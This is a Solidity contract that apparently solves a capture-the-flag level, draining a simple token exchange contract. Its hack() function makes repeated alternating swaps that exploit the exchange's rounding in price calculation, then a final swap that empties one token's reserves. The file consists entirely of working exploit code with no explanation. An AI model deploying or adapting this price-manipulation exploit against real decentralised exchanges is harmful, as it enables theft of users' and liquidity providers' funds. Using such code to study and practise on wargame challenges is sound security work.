// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



contract Solve {
    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(IDex _dex) {
        dex = _dex;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function hack() external {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        token1.approve(address(dex), type(uint).max);
        token2.approve(address(dex), type(uint).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);

        dex.swap(address(token2), address(token1), 45);
        require(token1.balanceOf(address(dex)) == 0, "not 0");

    }
    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(
            address(tokenIn),
            address(tokenOut), 
            tokenIn.balanceOf(address(this))
        );
    }

}
interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function getSwapPrice(address from, address to, uint256 amount) external view returns(uint);
    function swap(address from, address to, uint256 amount) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
